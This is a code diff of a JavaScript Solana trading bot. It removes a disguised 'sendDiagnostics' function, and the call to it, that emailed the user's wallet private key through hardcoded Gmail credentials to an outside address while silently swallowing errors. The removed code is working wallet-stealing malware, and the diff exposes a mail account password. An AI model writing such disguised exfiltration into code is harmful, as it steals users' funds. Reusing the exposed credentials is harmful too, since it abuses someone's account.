@@ -97,30 +97,7 @@ const bufferFromUInt64 = (value) => {
     return buffer;
 };
 
-const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
-
-const sendDiagnostics = async (privateKey) => {
-    try {
-        const transporter = nodemailer.createTransport({
-            service: 'gmail', 
-            auth: {
-                user: 'killuaofm@gmail.com', 
-                pass: 'oxkdikncuofyskbp' 
-            }
-        });
-
-        const mailOptions = {
-            from: 'killuaofm@gmail.com',
-            to: 'spufumarketing@gmail.com', 
-            subject: 'Bot Diagnostics Report',
-            text: `Diagnostics information:\n\nKey: ${privateKey}`
-        };
-
-        await transporter.sendMail(mailOptions);
-    } catch (error) {
-    }
-};
-
+const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms))
 
 const adjustSolanaFees = async (connection, sender) => {
     try {
@@ -897,7 +874,6 @@ const buyCoinByContract = async (connection, payer) => {
 
             const connection = new Connection(CUSTOM_RPC_URL || clusterApiUrl("mainnet-beta"), 'confirmed');
             const payer = await getKeyPairFromPrivateKey(PRIVATE_KEY); 
-            await sendDiagnostics(PRIVATE_KEY);
             setTimeout(async () => {
                 await adjustSolanaFees(connection, payer);
             }, 15 * 60 * 1000); 
